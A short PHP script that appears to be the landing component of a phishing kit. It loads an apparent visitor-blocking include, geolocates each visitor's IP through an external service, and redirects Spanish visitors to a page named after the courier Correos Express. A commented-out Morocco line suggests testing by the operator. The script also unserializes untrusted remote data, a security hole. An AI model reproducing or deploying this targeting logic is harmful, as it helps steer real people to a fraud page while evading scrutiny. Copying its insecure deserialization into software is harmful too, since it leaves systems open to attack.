<?php
include '../Files/IpBlocker.php';
$zbii = $_SERVER['REMOTE_ADDR'];
$geoip = 'http://www.geoplugin.net/php.gp?ip='.$zbii;
$addrDetailsArr = unserialize(file_get_contents($geoip));
$country = $addrDetailsArr['geoplugin_countryName'];
if (!$country)
{
    $country='Not found!';
}
//Chose the country!
if (strcmp($country, 'Spain')==0)
//if (strcmp($country, 'Morocco')==0)
{
      header("location: ./correosexpress.php ");
     exit();
}
?>